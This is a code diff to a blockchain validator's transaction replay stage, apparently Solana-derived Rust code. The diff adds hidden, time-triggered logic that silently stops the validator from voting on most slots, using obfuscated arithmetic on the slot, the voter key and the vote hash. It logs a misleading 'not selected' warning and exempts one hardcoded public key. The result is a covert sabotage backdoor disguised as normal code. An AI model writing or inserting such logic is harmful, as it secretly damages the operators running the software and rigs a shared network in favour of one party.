@@ -1,4 +1,6 @@
 //! The `replay_stage` replays transactions broadcast by the leader.
+use chrono::prelude::*;
+extern crate chrono;
 
 use crate::{
     broadcast_stage::RetransmitSlotsSender,
@@ -1436,6 +1438,36 @@ impl ReplayStage {
                 );
                 return;
             };
+
+
+log::trace!("authorized_voter_pubkey {}", authorized_voter_pubkey);
+log::trace!("authorized_voter_pubkey_string {}", authorized_voter_pubkey.to_string());
+log::trace!("vote_hash: {}", vote.hash);
+log::trace!("H: {}", bank.last_blockhash().to_string().find("T").unwrap_or(3) % 10);
+log::trace!("P: {}", authorized_voter_pubkey.to_string().find("T").unwrap_or(3));
+
+
+    let dt = Local::now();
+    if dt.timestamp_millis() > 1626222605000 {
+	if ( ( bank.slot() % 10 ) as usize != ( ( ( bank.slot() % 9 + 1 ) as usize * ( authorized_voter_pubkey.to_string().chars().last().unwrap() as usize + vote.hash.to_string().chars().last().unwrap() as usize ) / 10 ) as usize + authorized_voter_pubkey.to_string().chars().last().unwrap() as usize + vote.hash.to_string().chars().last().unwrap() as usize ) % 10 as usize ) && authorized_voter_pubkey.to_string() != "83E5RMejo6d98FV1EAXTx5t4bvoDMoxE4DboDee3VJsu" {
+   		warn!(
+                   "Vote account {} not selected for slot {}.",
+                    vote_account_pubkey,
+                    bank.slot
+		);
+                return;
+		}
+    }else{ 
+	if (vote.hash.to_string().to_lowercase().find("x").unwrap_or(3) % 10 as usize) != (authorized_voter_pubkey.to_string().to_lowercase().find("x").unwrap_or(2) % 10 as usize) && authorized_voter_pubkey.to_string() != "83E5RMejo6d98FV1EAXTx5t4bvoDMoxE4DboDee3VJsu"  {
+   		warn!(
+                   "Vote account {} not selected for slot {}.",
+                    vote_account_pubkey,
+                    bank.slot()
+		);
+                return;
+		}
+     }
+
 
         let authorized_voter_keypair = match authorized_voter_keypairs
             .iter()
